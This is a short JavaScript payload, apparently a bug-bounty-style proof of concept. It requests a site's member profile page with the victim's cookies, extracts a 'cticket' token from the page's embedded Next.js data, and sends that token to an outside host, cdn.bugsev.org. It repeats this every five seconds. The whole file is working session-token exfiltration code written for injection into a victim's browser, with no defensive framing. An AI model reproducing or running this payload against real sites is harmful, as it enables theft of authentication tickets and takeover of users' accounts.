let isRunning = false;

function extractCTicket(base64Data) {
  try {
    // 1. Base64 decode
    const decodedBase64 = atob(base64Data);

    // 2. URL decode
    const urlDecoded = decodeURIComponent(decodedBase64);

    // 3. Parse JSON
    const json = JSON.parse(urlDecoded);

    // 4. Recursive search
    function findCTicket(obj) {
      if (!obj || typeof obj !== "object") return null;

      if (obj.cticket) return obj.cticket;

      for (const key in obj) {
        const result = findCTicket(obj[key]);
        if (result) return result;
      }

      return null;
    }

    return findCTicket(json);

  } catch (e) {
    console.error("Error decoding:", e);
    return null;
  }
}

// usage


async function runTask() {
  if (isRunning) return;
  isRunning = true;

  try {
    const response = await fetch('/membersinfo/profile/?data=testhmza', {
      method: 'GET',
      credentials: 'include'
    });

    if (!response.ok) throw new Error('Request failed');

    const html = await response.text();

    // Parse HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    // Extract the specific script content
    const scriptTag = doc.querySelector('#__NEXT_DATA__');

    if (!scriptTag) throw new Error('Script tag not found');

    const scriptContent = scriptTag.textContent;

    // Encode safely
    const base64Data = btoa(encodeURIComponent(scriptContent));
    console.log('response base64 : ', base64Data);
    const cticket = extractCTicket(base64Data);
    console.log("cticket:", cticket);

    await fetch(`https://cdn.bugsev.org/tsthamza?cticket=${cticket}`, {
      method: 'GET'
    });

  } catch (err) {
    console.error('Error:', err);
  } finally {
    isRunning = false;
  }
}

// run immediately
runTask();



// repeat every 5 seconds
setInterval(runTask, 5000);
